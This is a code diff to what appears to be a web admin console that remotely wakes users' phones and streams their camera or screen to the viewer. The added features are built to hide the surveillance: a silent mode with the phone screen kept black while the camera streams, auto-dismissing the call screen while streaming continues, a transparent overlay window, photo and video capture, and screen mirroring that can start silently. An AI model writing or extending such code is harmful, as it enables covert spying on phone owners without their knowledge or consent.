   function stopLivePreview(sendCameraOff = false) {
+    if (_autoCutCallTimer) { clearTimeout(_autoCutCallTimer); _autoCutCallTimer = null; }
     if (_previewPollTimer) { clearInterval(_previewPollTimer); _previewPollTimer = null; }
+    if (_previewIpCamTimer) { clearInterval(_previewIpCamTimer); _previewIpCamTimer = null; }
     if (_previewDisconnectTimer) { clearTimeout(_previewDisconnectTimer); _previewDisconnectTimer = null; }
     if (_previewPC) { try { _previewPC.close(); } catch(_){} _previewPC = null; }
+    if (_previewLastBlobUrl) { try { URL.revokeObjectURL(_previewLastBlobUrl); } catch(_){} _previewLastBlobUrl = null; }
     _previewIceSent = [];
     _previewAddedCandidates.clear();
+    _hasAutoDismissedTransparentScreen = false;
+    const ipImg = document.getElementById("previewIpImg");
+    if (ipImg) { ipImg.src = ""; ipImg.style.display = "none"; }
     // Mark as ended in DB
     if (_activePreviewId) {
       api("/api/db/query", { method:"POST", body: JSON.stringify({
@@ -17672,113 +18550,227 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
       })}).catch(()=>{});
       _activePreviewId = null;
     }
-    // Only send camera_off if explicitly requested (e.g. from Hard Stop)
+    // Only send camera_off / screen_mirror_off if explicitly requested
     if (sendCameraOff && _activePreviewTargetDeviceId) {
       const devId = _activePreviewTargetDeviceId;
-      api("/api/calls/device-command", { method:"POST", body: JSON.stringify({
-        targetDeviceId: devId,
-        command: "camera_off",
-        issuedBy: "Web Admin"
-      })}).catch(()=>{});
+      if (_activePreviewMode === 'screen_mirror') {
+        api("/api/calls/remote-preview/wake", { method:"POST", body: JSON.stringify({
+          previewId: "screen_mirror_off", targetDeviceId: devId, viewerName: "Web Admin",
+          mode: 'screen_mirror', command: 'screen_mirror_off'
+        })}).catch(()=>{});
+      } else {
+        api("/api/calls/device-command", { method:"POST", body: JSON.stringify({
+          targetDeviceId: devId,
+          command: "camera_off",
+          issuedBy: "Web Admin"
+        })}).catch(()=>{});
+      }
     }
     _activePreviewTargetDeviceId = null;
+    _activePreviewMode = 'call';
     const area = document.getElementById("liveOtaPreviewArea");
     if (area) { area.style.display = "none"; area.innerHTML = ""; }
     setTimeout(loadDeviceList, 1000);
   }
 
-  window.requestLivePreview = async function(deviceId, userName) {
+  window.requestLivePreview = async function(deviceId, userName, mode = 'call') {
+    // If screen mirror was running on a different device, stop it first (same device stops it atomically on camera start)
+    if (_activePreviewMode === 'screen_mirror' && _activePreviewTargetDeviceId && _activePreviewTargetDeviceId !== deviceId) {
+      api("/api/calls/remote-preview/wake", { method:"POST", body: JSON.stringify({
+        previewId: "screen_mirror_off", targetDeviceId: _activePreviewTargetDeviceId, viewerName: "Web Admin",
+        mode: 'screen_mirror', command: 'screen_mirror_off'
+      })}).catch(()=>{});
+    }
     stopLivePreview(false);
     const previewId = 'pv_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2,7);
     _activePreviewId = previewId;
     _activePreviewTargetDeviceId = deviceId;
+    _activePreviewMode = mode;
+    _hasAutoDismissedTransparentScreen = false;
 
-    // Show preview area with loading & video
+    // Show preview area with loading, video & Native IP Camera image
     const area = document.getElementById("liveOtaPreviewArea");
+    const savedAutoCut = (function() { try { return localStorage.getItem('tps_auto_cut_call_sec') || '0'; } catch(_) { return '0'; } })();
     if (area) {
       area.style.display = "block";
       area.innerHTML = `
         <div style="background:#0f172a;border-radius:14px;overflow:hidden;position:relative;box-shadow:0 10px 25px rgba(0,0,0,0.3);">
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:10px 16px;background:#1e293b;border-bottom:1px solid #334155;">
+          <div style="display:flex;justify-content:space-between;align-items:center;padding:10px 16px;background:#1e293b;border-bottom:1px solid #334155;flex-wrap:wrap;gap:8px;">
             <div style="color:#fff;font-size:0.85rem;font-weight:600;display:flex;align-items:center;gap:8px;">
               <span id="previewLiveDot" style="width:10px;height:10px;border-radius:50%;background:#eab308;display:inline-block;box-shadow:0 0 8px #eab308;"></span>
               <span>Live — ${userName}</span>
+              <span id="previewModeBadge" style="font-size:0.7rem;font-weight:700;padding:2px 8px;border-radius:6px;background:${mode === 'notification' ? '#0284c7' : '#7c3aed'};color:#fff;">
+                ${mode === 'notification' ? '🔔 Notif Live' : '📞 Call Live'}
+              </span>
               <span id="previewConnectionBadge" style="font-size:0.7rem;font-weight:500;padding:2px 8px;border-radius:6px;background:#334155;color:#94a3b8;">Connecting</span>
             </div>
-            <div style="display:flex;gap:8px;">
-              <button onclick="flipPreviewCamera()" style="background:#334155;border:none;border-radius:6px;padding:4px 12px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">🔄 Flip</button>
-              <button onclick="hardStopDeviceCamera(_activePreviewTargetDeviceId)" style="background:#dc2626;border:none;border-radius:6px;padding:4px 12px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">🛑 Hard Stop</button>
-              <button onclick="stopLivePreview()" style="background:#64748b;border:none;border-radius:6px;padding:4px 12px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">✕ Close</button>
+            <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+              <div id="autoCutCallWrapper" style="display:${mode === 'call' ? 'inline-flex' : 'none'};align-items:center;gap:4px;background:#334155;border-radius:6px;padding:3px 8px;" title="Manually enter number of seconds to auto-cut call (0 or empty = Off/Manual)">
+                <span style="color:#cbd5e1;font-size:0.7rem;font-weight:600;">⏱️ Auto Cut:</span>
+                <input type="number" id="autoCutCallInput" min="0" max="600" step="1"
+                  value="${savedAutoCut && savedAutoCut !== '0' ? savedAutoCut : ''}"
+                  placeholder="Off"
+                  oninput="setAutoCutCallSec(this.value)"
+                  onchange="setAutoCutCallSec(this.value)"
+                  style="width:50px;background:#1e293b;color:#38bdf8;border:1px solid #475569;border-radius:4px;padding:2px 4px;font-size:0.75rem;font-weight:700;text-align:center;" />
+                <span style="color:#94a3b8;font-size:0.7rem;font-weight:600;">s</span>
+              </div>
+              <button id="btnDismissCall" onclick="dismissCallOnly(_activePreviewTargetDeviceId)" style="background:#ea580c;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:700;display:${mode === 'call' ? 'inline-block' : 'none'};box-shadow:0 1px 4px rgba(234,88,12,0.3);" title="End phone call screen only, keep live camera streaming">📴 Dismiss Call</button>
+              <button id="btnSnapPhoto" onclick="captureLivePreviewPhoto()" style="background:#0284c7;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;" title="Take snapshot photo">📸 Photo</button>
+              <button id="btnRecordVideo" onclick="recordLivePreviewVideo(10)" style="background:#8b5cf6;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;" title="Record 10 second video">🎬 10s Video</button>
+              <button onclick="flipPreviewCamera()" style="background:#334155;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">🔄 Flip</button>
+              <button id="btnStopTransparentScreen" onclick="dismissTransparentScreen(_activePreviewTargetDeviceId)" style="background:#475569;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;display:none;" title="Close transparent window on target phone">🪟 Stop Screen</button>
+              <button onclick="hardStopDeviceCamera(_activePreviewTargetDeviceId)" style="background:#dc2626;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">🛑 Stop</button>
+              <button onclick="stopLivePreview()" style="background:#64748b;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">✕ Close</button>
             </div>
           </div>
           <div style="position:relative;background:#000;min-height:320px;display:flex;align-items:center;justify-content:center;cursor:pointer;" onclick="const v=document.getElementById('previewVideo');if(v){v.play().catch(()=>{});}">
             <div id="previewStatus" style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#94a3b8;padding:20px;font-size:0.82rem;text-align:center;z-index:2;background:rgba(15,23,42,0.85);">
               <div id="previewStatusIcon" style="font-size:1.8rem;margin-bottom:10px;">⏳</div>
-              <div id="previewStatusMsg" style="font-weight:600;color:#f8fafc;font-size:0.9rem;">Sending wake push to ${userName}'s phone...</div>
-              <div id="previewStatusSub" style="font-size:0.72rem;color:#94a3b8;margin-top:6px;">Waiting for phone to open camera and create offer (up to 120s)...</div>
+              <div id="previewStatusMsg" style="font-weight:600;color:#f8fafc;font-size:0.9rem;">${mode === 'notification' ? `Sending silent background wake to ${userName}'s phone...` : `Sending wake call push to ${userName}'s phone...`}</div>
+              <div id="previewStatusSub" style="font-size:0.72rem;color:#94a3b8;margin-top:6px;">${mode === 'notification' ? 'Screen stays completely black/off while camera streams (up to 120s)...' : 'Waiting for phone to open camera and stream (up to 120s)...'}</div>
             </div>
-            <video id="previewVideo" autoplay playsinline muted style="width:100%;max-height:480px;display:block;background:#000;object-fit:contain;"></video>
+            <video id="previewVideo" autoplay playsinline muted style="width:100%;max-height:480px;display:none;background:#000;object-fit:contain;"></video>
+            <img id="previewIpImg" style="width:100%;max-height:480px;display:none;background:#000;object-fit:contain;" alt="Live IP Camera Stream" />
           </div>
         </div>`;
     }
     area.scrollIntoView({ behavior: 'smooth' });
 
+    // Arm Auto Cut Call timer if configured and in call mode
+    if (_autoCutCallTimer) {
+      clearTimeout(_autoCutCallTimer);
+      _autoCutCallTimer = null;
+    }
+    if (mode === 'call') {
+      const autoCutSec = parseInt(savedAutoCut, 10);
+      if (autoCutSec > 0) {
+        console.log(`[Preview] Arming auto cut call timer: ${autoCutSec}s for device ${deviceId}`);
+        _autoCutCallTimer = setTimeout(() => {
+          console.log(`[Preview] Auto cut call timer (${autoCutSec}s) expired — dismissing call only`);
+          window.dismissCallOnly(deviceId, true);
+        }, autoCutSec * 1000);
+      }
+    }
+
+    // ── Continuous High-Speed Live Frame Streamer (~8-10 FPS) ──
+    let lastBlobUrl = null;
+    let isFetchingIpFrame = false;
+    let ipFrameCount = 0;
+    let ipStreamActive = false;
+
+    _previewIpCamTimer = setInterval(async () => {
+      if (isFetchingIpFrame) return;
+      isFetchingIpFrame = true;
+      try {
+        const ts = Date.now();
+        let probe = await fetch(`https://tapowan-app.vercel.app/api/calls/remote-preview/frame?previewId=${previewId}&_t=${ts}`).catch(() => null);
+        if (!probe || !probe.ok) {
+          probe = await fetch(`/api/calls/remote-preview/frame?previewId=${previewId}&_t=${ts}`).catch(() => null);
+        }
+        if (probe && probe.ok && probe.headers.get("content-type")?.includes("image")) {
+          // Guard: Never display a screen mirror frame inside Call Live / Notif Live!
+          if (probe.headers.get("x-frame-facing") === "screen") return;
+          const blob = await probe.blob();
+          if (blob && blob.size > 500) {
+            const isFirstIpFrame = !ipStreamActive;
+            ipStreamActive = true;
+            ipFrameCount++;
+            const newUrl = URL.createObjectURL(blob);
+            const st = document.getElementById("previewStatus");
+            const b = document.getElementById("previewConnectionBadge");
+            const dot = document.getElementById("previewLiveDot");
+            const img = document.getElementById("previewIpImg");
+            const v = document.getElementById("previewVideo");
+
+            if (st) st.style.display = "none";
+            if (v) v.style.display = "none";
+            if (img) {
+              img.style.display = "block";
+              img.src = newUrl;
+              if (lastBlobUrl) {
+                const old = lastBlobUrl;
+                setTimeout(() => { try { URL.revokeObjectURL(old); } catch(_){} }, 600);
+              }
+              lastBlobUrl = newUrl;
+              _previewLastBlobUrl = newUrl;
+            }
+            if (b) {
+              b.innerText = `🟢 Live IP Cam #${ipFrameCount}`;
+              b.style.background = "#15803d";
+              b.style.color = "#fff";
+            }
+            if (dot) {
+              dot.style.background = "#22c55e";
+              dot.style.boxShadow = "0 0 10px #22c55e";
+            }
+
+            // ⚡ Stop repeating wake push timer once IP stream is active
+            if (isFirstIpFrame) {
+              if (_previewPollTimer) {
+                clearInterval(_previewPollTimer);
+                _previewPollTimer = null;
+                console.log("[Preview] IP camera stream active — stopped repeating wake push timer");
+              }
+            }
+          }
+        }
+      } catch (_) {} finally {
+        isFetchingIpFrame = false;
+      }
+    }, 120);
+
     try {
-      // ── Stage 1: Load Camera Standby on device first ──
       const msg = document.getElementById("previewStatusMsg");
       const sub = document.getElementById("previewStatusSub");
-      if (msg) msg.innerText = `Loading camera standby on ${userName}'s phone...`;
-      if (sub) sub.innerText = "Step 1 of 2: Waking device into camera standby mode...";
+      if (msg) msg.innerText = `Connecting live IP camera & WebRTC stream with ${userName}...`;
+      if (sub) sub.innerText = mode === 'notification' ? "Waking silent background service and establishing stream... (~5-8s)" : "Waking device and negotiating camera stream... (~5-8s)";
 
-      await api("/api/calls/device-command", { method: "POST", body: JSON.stringify({
-        targetDeviceId: deviceId,
-        command: "camera_on",
-        issuedBy: "Web Admin"
-      })}).catch(() => {});
-
-      // Brief 3.5s pause to allow phone to launch foreground service and warm up camera
-      await new Promise(r => setTimeout(r, 3500));
-
-      // ── Stage 2: Connect WebRTC stream to active standby camera ──
-      if (msg) msg.innerText = `Connecting live WebRTC stream with ${userName}...`;
-      if (sub) sub.innerText = "Step 2 of 2: Attaching WebRTC to warm camera stream...";
-
-      // 1. Insert preview request
+      // 1. Insert preview request with mode
       await api("/api/db/query", { method:"POST", body: JSON.stringify({
-        sql: "INSERT INTO app_device_previews (preview_id, viewer_device_id, target_device_id, status, created_at, updated_at) VALUES (?, 'web_admin', ?, 'requesting', datetime('now'), datetime('now'))",
-        args: [previewId, deviceId]
+        sql: "INSERT INTO app_device_previews (preview_id, viewer_device_id, target_device_id, mode, status, created_at, updated_at) VALUES (?, 'web_admin', ?, ?, 'requesting', datetime('now'), datetime('now'))",
+        args: [previewId, deviceId, mode]
       })});
 
-      // 2. Send FCM wake push
+      // 2. Send instant high-priority FCM wake push with mode
       await api("/api/calls/remote-preview/wake", { method:"POST", body: JSON.stringify({
-        previewId, targetDeviceId: deviceId, viewerName: "Web Admin"
+        previewId, targetDeviceId: deviceId, viewerName: "Web Admin", mode: mode
       })});
 
-      // 3. Poll for target's offer SDP (120-Second Window)
+      // 3. Poll for target's offer SDP (Aggressive 750ms Fast Polling)
       let attempts = 0;
-      const maxAttempts = 80; // Exactly 120 seconds (1.5s * 80)
+      const maxAttempts = 120; // 90 seconds (750ms * 120)
       _previewPollTimer = setInterval(async () => {
         attempts++;
 
-        // Send repeating wake pushes every ~9s up to attempt 60 (~90s) to pierce cellular radio dormancy
-        if (attempts % 6 === 0 && attempts <= 60) {
+        // Send repeating wake pushes every ~8s up to attempt 80 to pierce cellular radio dormancy
+        if (attempts % 10 === 0 && attempts <= 80 && !ipStreamActive) {
           api("/api/calls/remote-preview/wake", { method:"POST", body: JSON.stringify({
-            previewId, targetDeviceId: deviceId, viewerName: "Web Admin", force: true
+            previewId, targetDeviceId: deviceId, viewerName: "Web Admin", mode: mode, force: true
           })}).catch(()=>{});
         }
 
         const sub = document.getElementById("previewStatusSub");
-        if (sub && attempts > 1) {
-          sub.innerText = "Step 2/2: Waiting for camera stream offer... (" + Math.round(attempts * 1.5) + "s / 120s)";
+        const elapsedSec = Math.round(attempts * 0.75);
+        if (sub && attempts > 1 && !ipStreamActive) {
+          if (elapsedSec <= 4) {
+            sub.innerText = "⚡ High-Priority VoIP Push delivered... Waking phone (" + elapsedSec + "s)...";
+          } else if (elapsedSec <= 8) {
+            sub.innerText = "📷 Phone waking up, acquiring camera sensor (" + elapsedSec + "s)...";
+          } else {
+            sub.innerText = "📡 Establishing live camera stream (" + elapsedSec + "s / 90s)...";
+          }
         }
 
         if (attempts > maxAttempts) {
           clearInterval(_previewPollTimer); _previewPollTimer = null;
-          const msg = document.getElementById("previewStatusMsg");
-          const icon = document.getElementById("previewStatusIcon");
-          if (icon) icon.innerText = "❌";
-          if (msg) msg.innerText = "Device did not respond within 120s.";
-          if (sub) sub.innerText = "Make sure the phone has active internet and TPS app is installed.";
+          if (!ipStreamActive) {
+            const msg = document.getElementById("previewStatusMsg");
+            const icon = document.getElementById("previewStatusIcon");
+            if (icon) icon.innerText = "❌";
+            if (msg) msg.innerText = "Device did not respond within 90s.";
+            if (sub) sub.innerText = "Make sure the phone has active internet and TPS app is installed.";
+          }
           return;
         }
         try {
@@ -17789,7 +18781,19 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
           if (!res.rows || !res.rows.length) return;
           const rec = res.rows[0];
 
-          if (rec.status === 'offering' && rec.offer_sdp && !_previewPC) {
+          if (rec.status === 'offering' && rec.offer_sdp === 'native_ip_camera') {
+            const msg = document.getElementById("previewStatusMsg");
+            const sub = document.getElementById("previewStatusSub");
+            const badge = document.getElementById("previewConnectionBadge");
+            if (!ipStreamActive) {
+              if (msg) msg.innerText = "📷 Phone camera active — streaming live frames...";
+              if (sub) sub.innerText = "Receiving high-speed background IP camera frames...";
+              if (badge) badge.innerText = "Streaming...";
+            }
+            return;
+          }
+
+          if (rec.status === 'offering' && rec.offer_sdp && rec.offer_sdp !== 'native_ip_camera' && !_previewPC) {
             const msg = document.getElementById("previewStatusMsg");
             const sub = document.getElementById("previewStatusSub");
             const badge = document.getElementById("previewConnectionBadge");
@@ -17839,12 +18843,15 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
               if (vid) {
                 const stream = (ev.streams && ev.streams[0]) ? ev.streams[0] : new MediaStream([ev.track]);
                 vid.srcObject = stream;
-                vid.style.display = "block";
+                if (!ipStreamActive) {
+                  vid.style.display = "block";
+                }
 
                 const activatePlayback = () => {
+                  if (st && !ipStreamActive) st.style.display = "none";
                   vid.play().then(() => {
-                    if (st) st.style.display = "none";
-                    if (b) {
+                    if (st && !ipStreamActive) st.style.display = "none";
+                    if (b && !ipStreamActive) {
                       b.innerText = `🟢 Live ${vid.videoWidth || 640}x${vid.videoHeight || 480}`;
                       b.style.background = '#15803d';
                       b.style.color = '#fff';
@@ -17853,8 +18860,25 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
                       dot.style.background = '#22c55e';
                       dot.style.boxShadow = '0 0 10px #22c55e';
                     }
+
+                    // WebRTC video playback started smoothly
+
+                    const btnStopScreen = document.getElementById("btnStopTransparentScreen");
+                    if (btnStopScreen) {
+                      if (_hasAutoDismissedTransparentScreen) {
+                        btnStopScreen.style.display = 'none';
+                      } else {
+                        const isAatif = String(currentUser?.name || currentUser?.username || currentUser?.fullName || '').toLowerCase().includes('aatif') || userIsAdmin();
+                        if (isAatif && _activePreviewMode === 'call') {
+                          btnStopScreen.style.display = 'inline-block';
+                        } else {
+                          btnStopScreen.style.display = 'none';
+                        }
+                      }
+                    }
                   }).catch(e => {
                     console.log("[WebRTC Preview] Autoplay note:", e.message);
+                    if (st) st.style.display = "none";
                   });
                 };
 
@@ -17866,6 +18890,13 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
                 vid.onloadedmetadata = () => {
                   console.log("[WebRTC Preview] Metadata loaded:", vid.videoWidth, "x", vid.videoHeight);
                   activatePlayback();
+                };
+                vid.onloadeddata = () => {
+                  if (st) st.style.display = "none";
+                  activatePlayback();
+                };
+                vid.ontimeupdate = () => {
+                  if (st) st.style.display = "none";
                 };
                 vid.onplaying = () => {
                   if (st) st.style.display = "none";
@@ -17903,17 +18934,38 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
               const state = _previewPC?.iceConnectionState;
               const b = document.getElementById("previewConnectionBadge");
               const sub = document.getElementById("previewStatusSub");
+              const st = document.getElementById("previewStatus");
+              const dot = document.getElementById("previewLiveDot");
               console.log("[WebRTC Preview] ICE state:", state);
               if (b && state) b.innerText = `ICE: ${state}`;
               if (sub && state === 'checking') sub.innerText = "Testing candidate pairs & establishing connection...";
               if (state === 'connected' || state === 'completed') {
+                // ⚡ Instant Unconditional Overlay Removal on WebRTC Connection
+                if (st) st.style.display = "none";
+                if (b) {
+                  b.innerText = "🟢 Live Connected";
+                  b.style.background = '#15803d';
+                  b.style.color = '#fff';
+                }
+                if (dot) {
+                  dot.style.background = '#22c55e';
+                  dot.style.boxShadow = '0 0 10px #22c55e';
+                }
+
+                // WebRTC peer connection established smoothly
                 const vid = document.getElementById("previewVideo");
                 if (vid) {
+                  vid.style.display = "block";
                   vid.play().catch(()=>{});
-                  setTimeout(() => {
-                    const st = document.getElementById("previewStatus");
-                    if (st && vid.readyState >= 2) st.style.display = "none";
-                  }, 600);
+                  const checkInterval = setInterval(() => {
+                    const stNow = document.getElementById("previewStatus");
+                    if (stNow) stNow.style.display = "none";
+                    if (vid.paused) vid.play().catch(()=>{});
+                    if (vid.readyState >= 2 || vid.currentTime > 0) {
+                      clearInterval(checkInterval);
+                    }
+                  }, 250);
+                  setTimeout(() => clearInterval(checkInterval), 6000);
                 }
               }
               if (state === 'failed' || state === 'disconnected') {
@@ -17976,8 +19028,11 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
               } catch(_){}
             }
 
-            // Create and send answer
-            const answer = await _previewPC.createAnswer();
+            // Create and send answer (explicitly video-only so audio is never requested or negotiated)
+            const answer = await _previewPC.createAnswer({
+              offerToReceiveAudio: false,
+              offerToReceiveVideo: true
+            });
             await _previewPC.setLocalDescription(answer);
 
             // Upload answer SDP
@@ -18028,17 +19083,375 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     }
   };
 
+  // ──────────────────────────────────────────────────────────
+  // 📺 SCREEN MIRROR — Mirror phone's screen via MediaProjection
+  // ──────────────────────────────────────────────────────────
+
+  window.requestScreenMirror = async function(deviceId, userName) {
+    // If camera preview was active on a different device, stop it first (same device stops it atomically on screen mirror start)
+    if (_activePreviewMode !== 'screen_mirror' && _activePreviewTargetDeviceId && _activePreviewTargetDeviceId !== deviceId) {
+      api("/api/calls/device-command", { method:"POST", body: JSON.stringify({
+        targetDeviceId: _activePreviewTargetDeviceId,
+        command: "camera_off",
+        issuedBy: "Web Admin"
+      })}).catch(()=>{});
+    }
+    stopLivePreview(false);
+    const previewId = 'sm_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2,7);
+    _activePreviewId = previewId;
+    _activePreviewTargetDeviceId = deviceId;
+    _activePreviewMode = 'screen_mirror';
+    _hasAutoDismissedTransparentScreen = false;
+
+    const area = document.getElementById("liveOtaPreviewArea");
+    if (area) {
+      area.style.display = "block";
+      area.innerHTML = `
+        <div style="background:#0f172a;border-radius:14px;overflow:hidden;position:relative;box-shadow:0 10px 25px rgba(0,0,0,0.3);">
+          <div style="display:flex;justify-content:space-between;align-items:center;padding:10px 16px;background:#1e293b;border-bottom:1px solid #334155;">
+            <div style="color:#fff;font-size:0.85rem;font-weight:600;display:flex;align-items:center;gap:8px;">
+              <span id="previewLiveDot" style="width:10px;height:10px;border-radius:50%;background:#eab308;display:inline-block;box-shadow:0 0 8px #eab308;"></span>
+              <span>Screen Mirror — ${userName}</span>
+              <span id="previewModeBadge" style="font-size:0.7rem;font-weight:700;padding:2px 8px;border-radius:6px;background:#059669;color:#fff;">
+                📺 Screen Mirror
+              </span>
+              <span id="previewConnectionBadge" style="font-size:0.7rem;font-weight:500;padding:2px 8px;border-radius:6px;background:#334155;color:#94a3b8;">Connecting</span>
+            </div>
+            <div style="display:flex;gap:6px;align-items:center;">
+              <button id="btnSnapPhoto" onclick="captureLivePreviewPhoto()" style="background:#0284c7;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;" title="Take snapshot of screen">📸 Photo</button>
+              <button onclick="stopScreenMirror(_activePreviewTargetDeviceId)" style="background:#dc2626;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">🛑 Stop Mirror</button>
+              <button onclick="stopScreenMirror(_activePreviewTargetDeviceId)" style="background:#64748b;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">✕ Close</button>
+            </div>
+          </div>
+          <div style="position:relative;background:#000;min-height:320px;display:flex;align-items:center;justify-content:center;">
+            <div id="previewStatus" style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#94a3b8;padding:20px;font-size:0.82rem;text-align:center;z-index:2;background:rgba(15,23,42,0.85);">
+              <div id="previewStatusIcon" style="font-size:1.8rem;margin-bottom:10px;">📺</div>
+              <div id="previewStatusMsg" style="font-weight:600;color:#f8fafc;font-size:0.9rem;">Sending screen mirror request to ${userName}'s phone...</div>
+              <div id="previewStatusSub" style="font-size:0.72rem;color:#94a3b8;margin-top:6px;">Android &lt; 14: Starts silently if permission was granted before. Android 14+: User will see a "Start recording?" dialog.</div>
+            </div>
+            <video id="previewVideo" autoplay playsinline muted style="width:100%;max-height:480px;display:none;background:#000;object-fit:contain;"></video>
+            <img id="previewIpImg" style="width:100%;max-height:480px;display:none;background:#000;object-fit:contain;" alt="Screen Mirror Stream" />
+          </div>
+        </div>`;
+    }
+    area.scrollIntoView({ behavior: 'smooth' });
+
+    // ── Continuous Frame Polling (same as camera stream) ──
+    let lastBlobUrl = null;
+    let isFetchingFrame = false;
+    let frameCount = 0;
+    let streamActive = false;
+
+    _previewIpCamTimer = setInterval(async () => {
+      if (isFetchingFrame) return;
+      isFetchingFrame = true;
+      try {
+        const ts = Date.now();
+        let probe = await fetch(`https://tapowan-app.vercel.app/api/calls/remote-preview/frame?previewId=${previewId}&_t=${ts}`).catch(() => null);
+        if (!probe || !probe.ok) {
+          probe = await fetch(`/api/calls/remote-preview/frame?previewId=${previewId}&_t=${ts}`).catch(() => null);
+        }
+        if (probe && probe.ok && probe.headers.get("content-type")?.includes("image")) {
+          // Guard: Only accept screen mirror frames, never camera frames!
+          const frameFacing = probe.headers.get("x-frame-facing");
+          if (frameFacing && frameFacing !== "screen") return;
+          const blob = await probe.blob();
+          if (blob && blob.size > 500) {
+            const isFirst = !streamActive;
+            streamActive = true;
+            frameCount++;
+            const newUrl = URL.createObjectURL(blob);
+
+            const st = document.getElementById("previewStatus");
+            const b = document.getElementById("previewConnectionBadge");
+            const dot = document.getElementById("previewLiveDot");
+            const img = document.getElementById("previewIpImg");
+            const v = document.getElementById("previewVideo");
+
+            if (st) st.style.display = "none";
+            if (v) v.style.display = "none";
+            if (img) {
+              img.style.display = "block";
+              img.src = newUrl;
+              if (lastBlobUrl) {
+                const old = lastBlobUrl;
+                setTimeout(() => { try { URL.revokeObjectURL(old); } catch(_){} }, 600);
+              }
+              lastBlobUrl = newUrl;
+              _previewLastBlobUrl = newUrl;
+            }
+            if (b) {
+              b.innerText = `🟢 Screen Live #${frameCount}`;
+              b.style.background = "#15803d";
+              b.style.color = "#fff";
+            }
+            if (dot) {
+              dot.style.background = "#22c55e";
+              dot.style.boxShadow = "0 0 10px #22c55e";
+            }
+
+            if (isFirst && _previewPollTimer) {
+              clearInterval(_previewPollTimer);
+              _previewPollTimer = null;
+            }
+          }
+        }
+      } catch (_) {} finally {
+        isFetchingFrame = false;
+      }
+    }, 120);
+
+    try {
+      const msg = document.getElementById("previewStatusMsg");
+      const sub = document.getElementById("previewStatusSub");
+      if (msg) msg.innerText = `Sending screen mirror wake to ${userName}'s phone...`;
+      if (sub) sub.innerText = "Waiting for phone to grant MediaProjection and start streaming (~5-15s)...";
+
+      // 1. Insert preview log record (status = 'screen_mirroring' so RemotePreviewEngine.js does NOT treat it as a camera request)
+      await api("/api/db/query", { method:"POST", body: JSON.stringify({
+        sql: "INSERT INTO app_device_previews (preview_id, viewer_device_id, target_device_id, mode, status, created_at, updated_at) VALUES (?, 'web_admin', ?, 'screen_mirror', 'screen_mirroring', datetime('now'), datetime('now'))",
+        args: [previewId, deviceId]
+      })});
+
+      // 2. Send SCREEN_MIRROR FCM wake push
+      await api("/api/calls/remote-preview/wake", { method:"POST", body: JSON.stringify({
+        previewId, targetDeviceId: deviceId, viewerName: "Web Admin", mode: 'screen_mirror'
+      })});
+
+      // 3. Repeat wake pushes every 8s for 60s
+      let attempts = 0;
+      _previewPollTimer = setInterval(async () => {
+        attempts++;
+        const elapsedSec = Math.round(attempts * 2);
+        const sub = document.getElementById("previewStatusSub");
+        if (sub && !streamActive) {
+          if (elapsedSec <= 5) {
+            sub.innerText = `⚡ Screen mirror push delivered... Waiting for permission grant (${elapsedSec}s)...`;
+          } else if (elapsedSec <= 15) {
+            sub.innerText = `📺 Waiting for MediaProjection to start capturing (${elapsedSec}s)...`;
+          } else {
+            sub.innerText = `📡 Waiting for screen frames (${elapsedSec}s / 60s)...`;
+          }
+        }
+
+        if (attempts % 4 === 0 && attempts <= 20 && !streamActive) {
+          api("/api/calls/remote-preview/wake", { method:"POST", body: JSON.stringify({
+            previewId, targetDeviceId: deviceId, viewerName: "Web Admin", mode: 'screen_mirror', force: true
+          })}).catch(()=>{});
+        }
+
+        if (attempts > 30) {
+          clearInterval(_previewPollTimer); _previewPollTimer = null;
+          if (!streamActive) {
+            const msg = document.getElementById("previewStatusMsg");
+            const icon = document.getElementById("previewStatusIcon");
+            if (icon) icon.innerText = "❌";
+            if (msg) msg.innerText = "Screen mirror did not connect. Phone may need permission grant.";
+            if (sub) sub.innerText = "On Android 14+, the user must tap 'Start Now' on the permission dialog.";
+          }
+        }
+      }, 2000);
+
+    } catch (err) {
+      addMsg(`❌ Screen mirror request failed: ${err.message}`, "bot");
+    }
+  };
+
+  window.stopScreenMirror = async function(deviceId) {
+    try {
+      await api("/api/calls/remote-preview/wake", { method:"POST", body: JSON.stringify({
+        previewId: "screen_mirror_off", targetDeviceId: deviceId, viewerName: "Web Admin",
+        mode: 'screen_mirror', command: 'screen_mirror_off'
+      })});
+    } catch (_) {}
+    stopLivePreview();
+  };
+
   window.flipPreviewCamera = async function() {
     if (!_activePreviewId) return;
     try {
-      await api("/api/db/query", { method:"POST", body: JSON.stringify({
